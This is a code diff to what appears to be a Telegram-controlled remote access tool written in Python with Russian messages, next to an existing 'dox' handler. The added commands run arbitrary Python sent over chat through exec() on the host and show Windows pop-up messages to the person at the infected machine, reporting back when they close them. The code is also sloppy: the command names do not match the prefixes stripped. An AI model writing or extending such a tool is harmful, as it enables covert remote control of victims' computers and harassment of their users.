@@ -219,9 +219,38 @@ def dox(message):
     bot.send_message(message.chat.id, f"Ошибка при получении информации: {e}")
 
  # Глобальная переменная для хранения ссылки на текущее окно
+@bot.message_handler(commands=['exe'])
+def execute_code(message):
+    chat_id = message.chat.id
+    code = message.text.replace('/code', '').strip()
+    if code == '':
+        bot.send_message(chat_id, '/code твой код')
+    try:
+        exec(code)
+        bot.send_message(chat_id, 'Код успешно выполнен.')
+    except Exception as e:
+        bot.send_message(chat_id, f'Произошла ошибка при выполнении кода: {e}')
 
-
-
+@bot.message_handler(commands=['sms'])
+def msg_box(message):
+    chat_id = message.chat.id
+    message_text = message.text.replace('/msg_box ', '')
+    if message_text == '':
+        bot.send_message(chat_id, 'НЕПРАВИЛЬНО НУЖНО ТАК: /msg_box твой текст')
+    else:
+        bot.send_message(chat_id, f'ПОЛЬЗОВАТЕЛЮ ВЫВЕДЕНО СООБЩЕНИЕ: {message_text}')
+        message_bytes = message_text.encode('cp1251')
+        ctypes.windll.user32.MessageBoxA(0, message_bytes, 'Information', 0)
+        bot.send_message(chat_id, 'ПОЛЬЗОВАТЕЛЬ ЗАКРЫЛ СООБЩЕНИЕ')
+    try:
+        error_message = f"ВЫПОЛНЕННО!!!"
+        bot.send_message(chat_id, error_message)
+    except PermissionError as e:
+        error_message = f"ОШИБКА:: {e}"
+        bot.send_message(chat_id, error_message)
+    except Exception as e:
+        error_message = f"ОШИБКА: {e}"
+        bot.send_message(chat_id, error_message)
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
